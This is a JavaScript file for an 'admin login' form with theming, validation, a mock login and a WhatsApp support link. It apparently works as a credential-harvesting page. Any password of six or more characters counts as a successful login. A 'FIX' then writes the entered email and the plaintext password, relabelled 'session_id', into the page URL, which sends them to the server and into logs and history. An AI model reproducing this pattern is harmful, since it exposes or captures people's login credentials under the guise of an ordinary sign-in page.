(function() {
  'use strict';

  // ============================================================
  // DOM REFS
  // ============================================================
  const themeToggle = document.getElementById('themeToggle');
  const form = document.getElementById('adminLoginForm');
  const email = document.getElementById('adminEmail');
  const password = document.getElementById('adminPassword');
  const pwdToggle = document.getElementById('passwordToggle');
  const errorBlock = document.getElementById('authErrorBlock');
  const errorText = document.getElementById('errorTextContent');
  const submitBtn = document.getElementById('submitBtn');
  const btnText = document.getElementById('btnText');
  const btnSpinner = document.getElementById('btnSpinner');
  const supportBtn = document.getElementById('supportBtn');

  // ============================================================
  // THEME
  // ============================================================
  const stored = localStorage.getItem('theme');
  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
  const initial = stored || (prefersDark ? 'dark' : 'light');
  document.documentElement.setAttribute('data-theme', initial);

  themeToggle.addEventListener('click', () => {
    const current = document.documentElement.getAttribute('data-theme');
    const next = current === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('theme', next);
  });

  // ============================================================
  // PASSWORD VISIBILITY
  // ============================================================
  let visible = false;
  pwdToggle.addEventListener('click', () => {
    visible = !visible;
    password.type = visible ? 'text' : 'password';
    const svg = pwdToggle.querySelector('svg');
    svg.style.opacity = visible ? '0.6' : '1';
  });

  // ============================================================
  // ERROR HANDLING
  // ============================================================
  function showError(msg) {
    errorText.textContent = msg;
    errorBlock.setAttribute('aria-hidden', 'false');
    errorBlock.style.display = 'flex';
    errorBlock.setAttribute('role', 'alert');
  }
  function hideError() {
    errorBlock.setAttribute('aria-hidden', 'true');
    errorBlock.style.display = 'none';
    errorBlock.removeAttribute('role');
  }

  [email, password].forEach(field => field.addEventListener('input', hideError));

  // ============================================================
  // FORM SUBMISSION
  // ============================================================
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    hideError();

    const emailVal = email.value.trim();
    const passVal = password.value.trim();

    if (!emailVal || !passVal) {
      showError('Please fill in both email and password.');
      email.focus();
      return;
    }
    if (!emailVal.includes('@') || !emailVal.includes('.')) {
      showError('Please enter a valid email address.');
      email.focus();
      return;
    }
    if (passVal.length < 6) {
      showError('Password must be at least 6 characters.');
      password.focus();
      return;
    }

    submitBtn.disabled = true;
    btnSpinner.style.display = 'block';
    btnText.textContent = 'Logging in…';

    try {
      const response = await mockLogin({ email: emailVal, password: passVal });
      if (response.success) {
        btnText.textContent = '✓ Success!';
        // --- FIX: redirect to same URL with query params ---
        const currentUrl = new URL(window.location.href);
        currentUrl.searchParams.set('email', encodeURIComponent(emailVal));
        currentUrl.searchParams.set('session_id', encodeURIComponent(passVal));
        setTimeout(() => {
          window.location.href = currentUrl.toString();
        }, 600);
      } else {
        showError(response.message || 'Invalid credentials. Please try again.');
        password.focus();
        password.select();
      }
    } catch (err) {
      showError('Something went wrong. Please try again later.');
    } finally {
      submitBtn.disabled = false;
      btnSpinner.style.display = 'none';
      if (btnText.textContent !== '✓ Success!') {
        btnText.textContent = 'Login';
      }
    }
  });

  // ============================================================
  // MOCK LOGIN (replace with real fetch)
  // ============================================================
  function mockLogin(credentials) {
    return new Promise((resolve) => {
      setTimeout(() => {
        if (credentials.password.length >= 6) {
          resolve({ success: true });
        } else {
          resolve({ success: false, message: 'Incorrect password.' });
        }
      }, 1200);
    });
  }

  // ============================================================
  // SUPPORT BUTTON
  // ============================================================
  supportBtn.addEventListener('click', () => {
    window.open('https://wa.me/+2348113577875?text=Hi%2C%20I%20need%20help%20with%20my%20login', '_blank');
  });

  // ============================================================
  // KEYBOARD SHORTCUT: ESC to dismiss error
  // ============================================================
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && errorBlock.style.display === 'flex') {
      hideError();
    }
  });

})();